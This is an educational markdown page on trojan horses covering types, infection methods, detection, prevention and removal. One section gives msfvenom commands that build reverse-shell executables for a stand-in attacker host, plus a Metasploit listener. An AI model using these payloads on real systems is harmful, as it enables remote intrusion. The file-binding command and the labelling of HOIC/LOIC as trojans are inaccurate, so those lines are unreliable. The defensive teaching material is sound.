---
title: Trojans
description: Understanding Trojan horses, types, creation, and defense mechanisms
---

## What are Trojans?

Trojan horses are malicious programs disguised as legitimate software. Unlike viruses and worms, trojans don't self-replicate but rely on social engineering to trick users into executing them.

## Characteristics

- **Disguised**: Appears legitimate
- **No self-replication**: User must execute
- **Payload delivery**: Installs backdoors
- **Remote access**: Provides attacker control
- **Persistent**: Maintains access

## Types of Trojans

### 1. Remote Access Trojans (RAT)
- Complete system control
- Examples: DarkComet, njRAT, Poison Ivy
- Features: File management, keylogging, screen capture

### 2. Banking Trojans
- Steal financial credentials
- Examples: Zeus, Dridex, TrickBot
- Man-in-the-browser attacks

### 3. Downloader Trojans
- Download additional malware
- Small initial payload
- Evade detection

### 4. Backdoor Trojans
- Bypass authentication
- Create hidden entry points
- Persistent access

### 5. Rootkit Trojans
- Hide malware presence
- Kernel-level access
- Difficult to remove

### 6. DDoS Trojans
- Part of botnet
- Launch distributed attacks
- Examples: HOIC, LOIC

### 7. Ransomware Trojans
- Encrypt files
- Demand payment
- Examples: Locky, Cerber

## Common RAT Tools

### Commercial/Legitimate
- **TeamViewer**: Remote support (can be abused)
- **AnyDesk**: Remote desktop
- **Remote Desktop Protocol**: Built-in Windows

### Malicious
- **DarkComet**: Full-featured RAT
- **njRAT**: Popular in Middle East
- **Poison Ivy**: APT tool
- **AsyncRAT**: Open-source
- **Quasar**: C# based

## Infection Methods

### Social Engineering
```
Fake software updates
Pirated software
Email attachments
Game cheats/cracks
Free tools
```

### Drive-by Downloads
- Compromised websites
- Malicious ads
- Exploit kits

### USB/Removable Media
- Auto-run trojans
- Fake files

## Creating Trojans (Educational)

### msfvenom Example
```bash
# Generate Windows trojan
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f exe > backdoor.exe

# Linux trojan
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f elf > backdoor.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -o backdoor.apk
```

### Metasploit Handler
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

### Binding with Legitimate Files
```bash
# Combine trojan with legitimate file
cat legitimate.exe trojan.exe > combined.exe
```

## Detection Methods

### Behavior Analysis
- Unexpected network connections
- Unknown processes
- Registry modifications
- File system changes
- High CPU/memory usage

### Static Analysis
```bash
# Check file properties
file suspicious.exe
strings suspicious.exe
hexdump -C suspicious.exe | less

# Calculate hash
md5sum suspicious.exe
sha256sum suspicious.exe
```

### Dynamic Analysis
```bash
# Monitor network in sandbox
tcpdump -i any -n

# Process monitoring
strace ./suspicious
ltrace ./suspicious
```

### Tools
- **VirusTotal**: Online scanner
- **Hybrid Analysis**: Automated sandbox
- **Process Monitor**: Windows
- **Wireshark**: Network analysis
- **Autoruns**: Startup programs

## Prevention

### User Education
- Avoid unknown downloads
- Verify software sources
- Check file extensions
- Don't open suspicious emails

### Technical Controls
- Antivirus/EDR
- Application whitelisting
- Host-based firewall
- Least privilege
- Regular updates

### Network Security
- Egress filtering
- IDS/IPS
- Network segmentation
- Monitor outbound connections

## Removal

### Manual Steps
1. **Boot Safe Mode**
2. **Disable startup items**
3. **Kill malicious processes**
4. **Delete trojan files**
5. **Clean registry** (Windows)
6. **Reset browser**

### Automated Tools
```bash
# Linux
sudo apt install clamav
sudo freshclam
sudo clamscan -r --remove /

# Scan specific directory
sudo clamscan -r /home/user/
```

## Famous Trojans

- **Zeus (2007)**: Banking trojan, $70M+ stolen
- **Emotet (2014)**: Email-based, modular
- **TrickBot (2016)**: Banking, credential theft
- **Ryuk (2018)**: Ransomware, targeted attacks

## Legal Warning

⚠️ **Creating and distributing trojans is illegal!**
- Only for authorized testing
- Educational purposes in lab
- Written permission required
- Ethical guidelines mandatory

## Resources

- MITRE ATT&CK: Trojan techniques
- Malware Traffic Analysis
- Any.run: Interactive sandbox
